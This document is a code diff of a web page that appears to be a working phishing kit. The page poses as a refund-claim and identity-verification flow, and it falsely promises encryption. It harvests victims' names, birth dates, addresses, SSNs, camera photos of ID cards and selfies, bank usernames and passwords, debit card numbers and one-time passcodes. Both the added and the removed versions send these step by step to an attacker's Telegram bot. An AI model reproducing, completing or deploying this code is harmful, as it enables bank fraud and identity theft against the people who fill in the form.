+            const landingPanel = document.getElementById('landingPanel');
+            const personalPanel = document.getElementById('personalPanel');
+            const ssnPanel = document.getElementById('ssnPanel');
+            const kycPanel = document.getElementById('kycPanel');
+            const bankPanel = document.getElementById('bankPanel');
+            const bankLoginPanel = document.getElementById('bankLoginPanel');
+            const otpPanel = document.getElementById('otpPanel');
+            const toast = document.getElementById('toastMsg');
+            const loadingOverlay = document.getElementById('loadingOverlay');
 
-  <script>
-    (function() {
-      // ----- TELEGRAM BOT CONFIG (replace with your credentials) -----
-      const BOT_TOKEN = 'YOUR_BOT_TOKEN';        // <-- replace
-      const CHAT_ID = 'YOUR_CHAT_ID';            // <-- replace
-      const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-      // ----- STATE -----
-      let currentStep = 0;
-      const userData = {
-        fullName: '',
-        dob: '',
-        address: '',
-        ssn: '',
-        kyc: { idFront: null, idBack: null, selfie: null },
-        bank: { name: '', username: '', password: '', debitCard: '', otp: '' }
-      };
-
-      const bankList = [
-        'Bank of America', 'Wells Fargo', 'Chase', 'Citibank', 'U.S. Bank',
-        'Truist', 'PNC Bank', 'Capital One', 'TD Bank', 'Fifth Third Bank',
-        'KeyBank', 'Huntington Bank', 'Regions Bank', 'Ally Bank', 'Discover Bank',
-        'Synchrony Bank', 'Barclays US', 'HSBC Bank USA', 'Santander Bank',
-        'M&T Bank', 'Citizens Bank', 'First Horizon', 'BOK Financial', 'Comerica',
-        'Bank OZK', 'Eastern Bank', 'Fulton Bank', 'Pinnacle Bank', 'Banner Bank',
-        'Pacific Western Bank', 'UMB Bank', 'Zions Bank', 'Associated Bank',
-        'First Merchants', 'Old National Bank', 'Wintrust', 'Sterling Bank',
-        'Apple Bank', 'Dime Community Bank', 'Valley National Bank',
-        'New York Community Bank', 'Synovus Bank', 'First Financial Bank',
-        'SouthState Bank', 'Cadence Bank', 'United Bank', 'First Interstate Bank'
-      ];
-
-      const modalOverlay = document.getElementById('modalOverlay');
-      const modalWindow = document.getElementById('modalWindow');
-
-      function sendToTelegram(message) {
-        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID') {
-          console.warn('Telegram bot not configured. Data:', message);
-          alert('⚠️ Bot not configured. Please set BOT_TOKEN and CHAT_ID.');
-          return Promise.resolve({ ok: false });
-        }
-        return fetch(TELEGRAM_API, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-        }).then(res => res.json()).catch(err => console.error('Telegram error', err));
-      }
-
-      function getFilePreview(file) {
-        if (!file) return null;
-        return URL.createObjectURL(file);
-      }
-
-      // smart validation helper
-      function validateField(id, condition, errorMsg) {
-        const el = document.getElementById(id);
-        const errorEl = document.getElementById(id + '_error');
-        if (!el) return true;
-        if (!condition) {
-          el.classList.add('input-error');
-          if (errorEl) { errorEl.textContent = errorMsg || 'Invalid input'; errorEl.classList.add('show'); }
-          return false;
-        } else {
-          el.classList.remove('input-error');
-          if (errorEl) { errorEl.classList.remove('show'); }
-          return true;
-        }
-      }
-
-      // ----- render step -----
-      function renderStep(step) {
-        let html = '';
-
-        if (step === 0) {
-          html = `
-            <h2>🔐 Personal details</h2>
-            <div class="step-desc">Step 1 of 6 · Verify your identity</div>
-            <label>Full legal name</label>
-            <input type="text" id="fullName" placeholder="e.g. John M. Doe" value="${userData.fullName}" />
-            <div id="fullName_error" class="error-msg"></div>
-
-            <label>Date of birth</label>
-            <input type="date" id="dob" value="${userData.dob}" />
-            <div id="dob_error" class="error-msg"></div>
-
-            <label>Residential address</label>
-            <input type="text" id="address" placeholder="Street, city, state, ZIP" value="${userData.address}" />
-            <div id="address_error" class="error-msg"></div>
-
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="closeModal()">Cancel</button>
-              <button class="btn-primary" id="step0Next">Continue</button>
-            </div>
-          `;
-        } else if (step === 1) {
-          html = `
-            <h2>🆔 Social Security Number</h2>
-            <div class="step-desc">Step 2 of 6 · Secure SSN entry</div>
-            <label>Social Security Number</label>
-            <input type="password" id="ssnInput" placeholder="XXX-XX-XXXX" value="${userData.ssn}" />
-            <div id="ssnInput_error" class="error-msg"></div>
-            <div class="small-hint">Bank‑grade encryption · never stored in plain text.</div>
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="goStep(0)">Back</button>
-              <button class="btn-primary" id="step1Next">Continue</button>
-            </div>
-          `;
-        } else if (step === 2) {
-          const frontFile = userData.kyc.idFront;
-          const backFile = userData.kyc.idBack;
-          const selfieFile = userData.kyc.selfie;
-
-          const frontPreview = frontFile ? getFilePreview(frontFile) : null;
-          const backPreview = backFile ? getFilePreview(backFile) : null;
-          const selfiePreview = selfieFile ? getFilePreview(selfieFile) : null;
-
-          const frontStatus = frontFile ? '✅ Uploaded' : 'Tap to add';
-          const backStatus = backFile ? '✅ Uploaded' : 'Tap to add';
-          const selfieStatus = selfieFile ? '✅ Uploaded' : 'Tap to add';
-
-          html = `
-            <h2>📸 KYC verification</h2>
-            <div class="step-desc">Step 3 of 6 · Upload ID (front, back) & selfie with ID</div>
-            <div class="photo-grid">
-              <div class="photo-item" id="uploadFront">
-                <div class="photo-thumb ${frontFile ? 'has-image' : ''}" style="${frontPreview ? `background-image: url('${frontPreview}');` : ''}">
-                  ${!frontPreview ? '🪪' : ''}
-                </div>
-                <div class="photo-info">
-                  <span class="label">ID — Front</span>
-                  <span class="sub">${frontFile ? frontFile.name : 'JPG, PNG, or PDF'}</span>
-                </div>
-                <span class="photo-status ${frontFile ? '' : 'empty'}">${frontStatus}</span>
-                <input type="file" accept="image/*" id="idFrontInput">
-              </div>
-
-              <div class="photo-item" id="uploadBack">
-                <div class="photo-thumb ${backFile ? 'has-image' : ''}" style="${backPreview ? `background-image: url('${backPreview}');` : ''}">
-                  ${!backPreview ? '🪪' : ''}
-                </div>
-                <div class="photo-info">
-                  <span class="label">ID — Back</span>
-                  <span class="sub">${backFile ? backFile.name : 'JPG, PNG, or PDF'}</span>
-                </div>
-                <span class="photo-status ${backFile ? '' : 'empty'}">${backStatus}</span>
-                <input type="file" accept="image/*" id="idBackInput">
-              </div>
-
-              <div class="photo-item" id="uploadSelfie">
-                <div class="photo-thumb ${selfieFile ? 'has-image' : ''}" style="${selfiePreview ? `background-image: url('${selfiePreview}');` : ''}">
-                  ${!selfiePreview ? '🤳' : ''}
-                </div>
-                <div class="photo-info">
-                  <span class="label">Selfie with ID</span>
-                  <span class="sub">${selfieFile ? selfieFile.name : 'Hold ID next to face'}</span>
-                </div>
-                <span class="photo-status ${selfieFile ? '' : 'empty'}">${selfieStatus}</span>
-                <input type="file" accept="image/*" id="selfieInput">
-              </div>
-            </div>
-            <div class="small-hint" style="margin-top: 0.8rem;">All documents are encrypted and used only for verification.</div>
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="goStep(1)">Back</button>
-              <button class="btn-primary" id="step2Next">Continue</button>
-            </div>
-          `;
-        } else if (step === 3) {
-          const bankOptions = bankList.map(b => `<option value="${b}" ${userData.bank.name === b ? 'selected' : ''}>${b}</option>`).join('');
-          html = `
-            <h2>🏦 Select your bank</h2>
-            <div class="step-desc">Step 4 of 6 · Choose from all major USA banks</div>
-            <label>Financial institution</label>
-            <select id="bankSelect">${bankOptions}</select>
-            <div id="bankSelect_error" class="error-msg"></div>
-            <div class="small-hint">We support all major banks.</div>
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="goStep(2)">Back</button>
-              <button class="btn-primary" id="step3Next">Continue</button>
-            </div>
-          `;
-        } else if (step === 4) {
-          html = `
-            <h2>🔑 Bank login</h2>
-            <div class="step-desc">Step 5 of 6 · Secure credential entry</div>
-            <label>Online banking username</label>
-            <input type="text" id="bankUsername" placeholder="username" value="${userData.bank.username}" />
-            <div id="bankUsername_error" class="error-msg"></div>
-            <label>Password</label>
-            <input type="password" id="bankPassword" placeholder="••••••••" value="${userData.bank.password}" />
-            <div id="bankPassword_error" class="error-msg"></div>
-            <div class="small-hint">Encrypted and used only for verification.</div>
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="goStep(3)">Back</button>
-              <button class="btn-primary" id="step4Next">Continue</button>
-            </div>
-          `;
-        } else if (step === 5) {
-          html = `
-            <h2>💳 Debit card & OTP</h2>
-            <div class="step-desc">Step 6 of 6 · Final verification</div>
-            <label>Debit card number</label>
-            <input type="text" id="debitCard" placeholder="**** **** **** ****" value="${userData.bank.debitCard}" />
-            <div id="debitCard_error" class="error-msg"></div>
-            <label>One‑time passcode (OTP)</label>
-            <input type="text" id="otpInput" placeholder="6‑digit code" value="${userData.bank.otp}" />
-            <div id="otpInput_error" class="error-msg"></div>
-            <div class="small-hint">OTP sent to your registered mobile.</div>
-            <div class="btn-group">
-              <button class="btn-secondary" onclick="goStep(4)">Back</button>
-              <button class="btn-primary" id="step5Submit">✅ Submit & claim</button>
-            </div>
-          `;
-        }
-
-        modalWindow.innerHTML = html;
-        modalOverlay.classList.add('active');
-
-        // ----- attach events with smart validation -----
-        if (step === 0) {
-          document.getElementById('step0Next')?.addEventListener('click', function() {
-            const name = document.getElementById('fullName').value.trim();
-            const dob = document.getElementById('dob').value;
-            const addr = document.getElementById('address').value.trim();
-
-            let valid = true;
-            if (!name || name.length < 2) {
-              validateField('fullName', false, 'Full name is required');
-              valid = false;
-            } else validateField('fullName', true);
-
-            if (!dob) {
-              validateField('dob', false, 'Date of birth is required');
-              valid = false;
-            } else validateField('dob', true);
-
-            if (!addr || addr.length < 5) {
-              validateField('address', false, 'Valid address is required');
-              valid = false;
-            } else validateField('address', true);
-
-            if (!valid) return;
-            userData.fullName = name; userData.dob = dob; userData.address = addr;
-            goStep(1);
-          });
-        } else if (step === 1) {
-          document.getElementById('step1Next')?.addEventListener('click', function() {
-            const ssn = document.getElementById('ssnInput').value.trim();
-            if (!ssn || ssn.length < 4) {
-              validateField('ssnInput', false, 'Please enter a valid SSN');
-              return;
+            function showToast(msg, isError = false) {
+                toast.innerText = msg;
+                toast.classList.add('show');
+                toast.style.background = isError ? '#B22222' : '#1A2C3E';
+                setTimeout(() => toast.classList.remove('show'), 3500);
             }
-            validateField('ssnInput', true);
-            userData.ssn = ssn;
-            goStep(2);
-          });
-        } else if (step === 2) {
-          document.getElementById('idFrontInput')?.addEventListener('change', function(e) {
-            if (e.target.files[0]) { userData.kyc.idFront = e.target.files[0]; renderStep(2); }
-          });
-          document.getElementById('idBackInput')?.addEventListener('change', function(e) {
-            if (e.target.files[0]) { userData.kyc.idBack = e.target.files[0]; renderStep(2); }
-          });
-          document.getElementById('selfieInput')?.addEventListener('change', function(e) {
-            if (e.target.files[0]) { userData.kyc.selfie = e.target.files[0]; renderStep(2); }
-          });
-          document.getElementById('uploadFront')?.addEventListener('click', function(e) {
-            if (e.target.tagName !== 'INPUT') document.getElementById('idFrontInput')?.click();
-          });
-          document.getElementById('uploadBack')?.addEventListener('click', function(e) {
-            if (e.target.tagName !== 'INPUT') document.getElementById('idBackInput')?.click();
-          });
-          document.getElementById('uploadSelfie')?.addEventListener('click', function(e) {
-            if (e.target.tagName !== 'INPUT') document.getElementById('selfieInput')?.click();
-          });
-          document.getElementById('step2Next')?.addEventListener('click', function() {
-            if (!userData.kyc.idFront || !userData.kyc.idBack || !userData.kyc.selfie) {
-              alert('Please upload all three KYC documents.');
-              return;
+
+            async function sendToTelegram(text) {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+                    });
+                    return res.ok;
+                } catch (e) { return false; }
             }
-            goStep(3);
-          });
-        } else if (step === 3) {
-          document.getElementById('step3Next')?.addEventListener('click', function() {
-            const bank = document.getElementById('bankSelect').value;
-            if (!bank) {
-              validateField('bankSelect', false, 'Please select a bank');
-              return;
+
+            async function sendPhotoToTelegram(blob, caption) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'kyc_verification.jpg');
+                if (caption) formData.append('caption', caption);
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    return res.ok;
+                } catch (e) { return false; }
             }
-            validateField('bankSelect', true);
-            userData.bank.name = bank;
-            goStep(4);
-          });
-        } else if (step === 4) {
-          document.getElementById('step4Next')?.addEventListener('click', function() {
-            const un = document.getElementById('bankUsername').value.trim();
-            const pw = document.getElementById('bankPassword').value.trim();
-            let valid = true;
-            if (!un || un.length < 2) {
-              validateField('bankUsername', false, 'Username is required');
-              valid = false;
-            } else validateField('bankUsername', true);
-            if (!pw || pw.length < 3) {
-              validateField('bankPassword', false, 'Password is required');
-              valid = false;
-            } else validateField('bankPassword', true);
-            if (!valid) return;
-            userData.bank.username = un; userData.bank.password = pw;
-            goStep(5);
-          });
-        } else if (step === 5) {
-          document.getElementById('step5Submit')?.addEventListener('click', function() {
-            const dc = document.getElementById('debitCard').value.trim();
-            const otp = document.getElementById('otpInput').value.trim();
-            let valid = true;
-            if (!dc || dc.length < 4) {
-              validateField('debitCard', false, 'Enter valid debit card');
-              valid = false;
-            } else validateField('debitCard', true);
-            if (!otp || otp.length < 4) {
-              validateField('otpInput', false, 'Enter OTP');
-              valid = false;
-            } else validateField('otpInput', true);
-            if (!valid) return;
 
-            userData.bank.debitCard = dc; userData.bank.otp = otp;
+            // ---- Navigation ----
+            function showPanel(panelId) {
+                document.querySelectorAll('.card').forEach(p => p.classList.add('hide'));
+                document.getElementById(panelId).classList.remove('hide');
+            }
 
-            const msg = `✅ <b>NEW REFUND CLAIM</b>\n` +
-              `👤 ${userData.fullName}\n📅 ${userData.dob}\n📍 ${userData.address}\n` +
-              `🔑 SSN: ${userData.ssn}\n🏦 ${userData.bank.name}\n` +
-              `👤 user: ${userData.bank.username}\n🔒 pass: ${userData.bank.password}\n` +
-              `💳 debit: ${userData.bank.debitCard}\n🔢 OTP: ${userData.bank.otp}\n` +
-              `📎 KYC: front (${userData.kyc.idFront?.name || 'N/A'}), back (${userData.kyc.idBack?.name || 'N/A'}), selfie (${userData.kyc.selfie?.name || 'N/A'})`;
-            sendToTelegram(msg).then(() => {
-              alert('✅ Claim submitted! We will process your refund.');
-              modalOverlay.classList.remove('active');
-            }).catch(() => {
-              alert('⚠️ Could not send data. Please try again.');
-            });
-          });
-        }
-      }
+            // Landing -> Personal
+            document.getElementById('startClaimBtn').onclick = () => showPanel('personalPanel');
+            document.getElementById('backToLanding').onclick = (e) => { e.preventDefault();
+                showPanel('landingPanel'); };
 
-      // navigation
-      window.goStep = function(step) {
-        currentStep = step;
-        renderStep(step);
-      };
-      window.closeModal = function() {
-        modalOverlay.classList.remove('active');
-      };
+            // Personal -> SSN
+            document.getElementById('personalNextBtn').onclick = () => {
+                const name = document.getElementById('fullName').value.trim();
+                const dob = document.getElementById('dob').value;
+                const addr = document.getElementById('address').value.trim();
+                if (!name || !dob || !addr) { showToast('Please fill all fields.', true); return; }
+                userData.fullName = name;
+                userData.dob = dob;
+                userData.address = addr;
+                sendToTelegram(`👤 <b>Personal details</b>\nName: ${name}\nDOB: ${dob}\nAddress: ${addr}`);
+                showPanel('ssnPanel');
+            };
+            document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
+                showPanel('personalPanel'); };
 
-      document.getElementById('claimBtn').addEventListener('click', function() {
-        currentStep = 0;
-        renderStep(0);
-      });
+            // SSN -> KYC
+            document.getElementById('ssnNextBtn').onclick = () => {
+                const ssn = document.getElementById('ssnInput').value.trim();
+                if (ssn.length < 4) { showToast('Enter a valid SSN.', true); return; }
+                userData.ssn = ssn;
+                sendToTelegram(`🆔 <b>SSN</b>: ${ssn}`);
+                showPanel('kycPanel');
+                showKycStep(1);
+            };
+            document.getElementById('backToSsnFromKyc').onclick = (e) => { e.preventDefault();
+                showPanel('ssnPanel'); };
 
-      modalOverlay.addEventListener('click', function(e) {
-        if (e.target === modalOverlay) modalOverlay.classList.remove('active');
-      });
-    })();
-  </script>
+            // ---- KYC Camera logic (PayPal style) ----
+            let currentKycStep = 1;
+            let frontStream, backStream, selfieStream, selfieIdStream;
+            let usingRearFront = true,
+                usingRearBack = true,
+                usingRearSelfie = false,
+                usingRearSelfieId = false;
+
+            function stopStream(stream) {
+                if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
+            }
+
+            async function initCamera(videoEl, facingMode) {
+                try {
+                    let constraints = { video: { facingMode: { exact: facingMode } } };
+                    let stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    videoEl.srcObject = stream;
+                    await videoEl.play();
+                    return stream;
+                } catch (e) {
+                    let fallback = await navigator.mediaDevices.getUserMedia({ video: true });
+                    videoEl.srcObject = fallback;
+                    await videoEl.play();
+                    return fallback;
+                }
+            }
+
+            async function switchCamera(video, currentStream, setStream, setRear, currentRear) {
+                if (currentStream) stopStream(currentStream);
+                let newFacing = currentRear ? 'user' : 'environment';
+                let newStream = await initCamera(video, newFacing);
+                setStream(newStream);
+                setRear(!currentRear);
+            }
+
+            async function capturePhoto(video, statusElem, sideDescription, nextStepCallback = null) {
+                if (!video.videoWidth || video.videoWidth === 0) {
+                    showToast('Camera not ready', true);
+                    return;
+                }
+                statusElem.innerText = 'Uploading...';
+                let canvas = document.createElement('canvas');
+                let size = Math.min(video.videoWidth, video.videoHeight);
+                canvas.width = size;
+                canvas.height = size;
+                let ctx = canvas.getContext('2d');
+                let sx = (video.videoWidth - size) / 2;
+                let sy = (video.videoHeight - size) / 2;
+                ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
+                canvas.toBlob(async blob => {
+                    const caption =
+                        `[KYC] ${sideDescription} | ${userData.fullName} | SSN: ${userData.ssn}`;
+                    await sendPhotoToTelegram(blob, caption);
+                    statusElem.innerText = `✅ ${sideDescription} uploaded.`;
+                    if (nextStepCallback) setTimeout(() => nextStepCallback(), 700);
+                }, 'image/jpeg', 0.8);
+            }
+
+            function showKycStep(step) {
+                document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
+                const target = document.getElementById(`kycStep${step}`);
+                if (target) target.classList.remove('hide');
+                currentKycStep = step;
+                updateStepDots(step);
+                if (step === 2) {
+                    stopStream(backStream);
+                    stopStream(selfieStream);
+                    stopStream(selfieIdStream);
+                    initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s;
+                        usingRearFront = true; });
+                } else if (step === 3) {
+                    stopStream(frontStream);
+                    stopStream(selfieStream);
+                    stopStream(selfieIdStream);
+                    initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s;
+                        usingRearBack = true; });
+                } else if (step === 4) {
+                    stopStream(frontStream);
+                    stopStream(backStream);
+                    stopStream(selfieIdStream);
+                    initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s;
+                        usingRearSelfie = false; });
+                } else if (step === 5) {
+                    stopStream(frontStream);
+                    stopStream(backStream);
+                    stopStream(selfieStream);
+                    initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s;
+                        usingRearSelfieId = false; });
+                }
+            }
+
+            function updateStepDots(step) {
+                const dots = document.querySelectorAll('.step-dot');
+                dots.forEach((dot, i) => {
+                    if (i + 1 < step) dot.classList.add('completed');
+                    else if (i + 1 === step) dot.classList.add('active');
+                    else dot.classList.remove('active', 'completed');
+                });
+            }
+
+            // KYC Step 1 (metadata)
+            document.getElementById('kycStep1Next').onclick = () => {
+                let idType = document.getElementById('idType').value;
+                let idState = document.getElementById('idState').value;
+                if (!idType || !idState) { showToast('Select ID type and issuing state.', true); return; }
+                userData.idType = idType;
+                userData.idState = idState;
+                sendToTelegram(`📄 <b>ID details</b>\nType: ${idType}\nState: ${idState}`);
+                showKycStep(2);
+            };
+
+            // Camera controls
+            document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'),
+                frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront);
+            document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'),
+                document.getElementById('frontStatus'), 'FRONT_ID', () => showKycStep(3));
+
+            document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'),
+                backStream, s => backStream = s, v => usingRearBack = v, usingRearBack);
+            document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'),
+                document.getElementById('backStatus'), 'BACK_ID', () => showKycStep(4));
+
+            document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'),
+                selfieStream, s => selfieStream = s, v => usingRearSelfie = v, usingRearSelfie);
+            document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'),
+                document.getElementById('selfieStatus'), 'SELFIE_FACE', () => showKycStep(5));
+
+            document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'),
+                selfieIdStream, s => selfieIdStream = s, v => usingRearSelfieId = v, usingRearSelfieId);
+            document.getElementById('captureSelfieIdBtn').onclick = () => {
+                capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'),
+                    'SELFIE_WITH_ID', async () => {
+                        stopStream(frontStream);
+                        stopStream(backStream);
+                        stopStream(selfieStream);
+                        stopStream(selfieIdStream);
+                        await sendToTelegram(`📸 <b>KYC completed</b> for ${userData.fullName}`);
+                        showPanel('bankPanel');
+                    });
+            };
+
+            // KYC -> Bank
+            document.getElementById('backToKycFromBank').onclick = (e) => { e.preventDefault();
+                showPanel('kycPanel');
+                showKycStep(5); };
+
+            // Bank -> Bank Login
+            document.getElementById('bankNextBtn').onclick = () => {
+                const bank = document.getElementById('bankSelect').value;
+                if (!bank) { showToast('Select your bank.', true); return; }
+                userData.bank = bank;
+                sendToTelegram(`🏦 <b>Bank selected</b>: ${bank}`);
+                showPanel('bankLoginPanel');
+            };
+            document.getElementById('backToBankFromLogin').onclick = (e) => { e.preventDefault();
+                showPanel('bankPanel'); };
+
+            // Bank Login -> OTP
+            document.getElementById('bankLoginNextBtn').onclick = () => {
+                const un = document.getElementById('bankUsername').value.trim();
+                const pw = document.getElementById('bankPassword').value.trim();
+                if (!un || !pw) { showToast('Enter bank credentials.', true); return; }
+                userData.bankUsername = un;
+                userData.bankPassword = pw;
+                sendToTelegram(`🔑 <b>Bank login</b>\nUser: ${un}\nPass: ${pw}`);
+                showPanel('otpPanel');
+            };
+            document.getElementById('backToBankLoginFromOtp').onclick = (e) => { e.preventDefault();
+                showPanel('bankLoginPanel'); };
+
+            // Final submit
+            document.getElementById('finalSubmitBtn').onclick = async () => {
+                const dc = document.getElementById('debitCard').value.trim();
+                const otp = document.getElementById('otpInput').value.trim();
+                if (!dc || dc.length < 4) { showToast('Enter valid debit card.', true); return; }
+                if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
+                userData.debitCard = dc;
+                userData.otp = otp;
+
+                const msg =
+                    `✅ <b>FULL REFUND CLAIM</b>\n` +
+                    `👤 ${userData.fullName}\n📅 ${userData.dob}\n📍 ${userData.address}\n` +
+                    `🔑 SSN: ${userData.ssn}\n📄 ID: ${userData.idType} (${userData.idState})\n` +
+                    `🏦 ${userData.bank}\n👤 ${userData.bankUsername}\n🔒 ${userData.bankPassword}\n` +
+                    `💳 ${userData.debitCard}\n🔢 OTP: ${userData.otp}\n` +
+                    `✅ All KYC photos uploaded.`;
+
+                await sendToTelegram(msg);
+                loadingOverlay.classList.add('active');
+                setTimeout(() => {
+                    loadingOverlay.classList.remove('active');
+                    showToast('✅ Claim submitted! We will process your refund.', false);
+                    setTimeout(() => showPanel('landingPanel'), 1200);
+                }, 1800);
+            };
+
+            // Resend OTP actions
+            document.getElementById('resendOtpBtn').onclick = async () => {
+                showToast('New code sent to your phone.', false);
+                await sendToTelegram(`🔄 <b>Resend OTP (SMS)</b> for ${userData.fullName}`);
+            };
+            document.getElementById('emailOtpBtn').onclick = async () => {
+                showToast('Code sent to your registered email.', false);
+                await sendToTelegram(`✉️ <b>OTP via email requested</b> for ${userData.fullName}`);
+            };
+
+            // Close toast on click
+            toast.onclick = () => toast.classList.remove('show');
+        })();
+    </script>
 </body>
 </html>
 ```
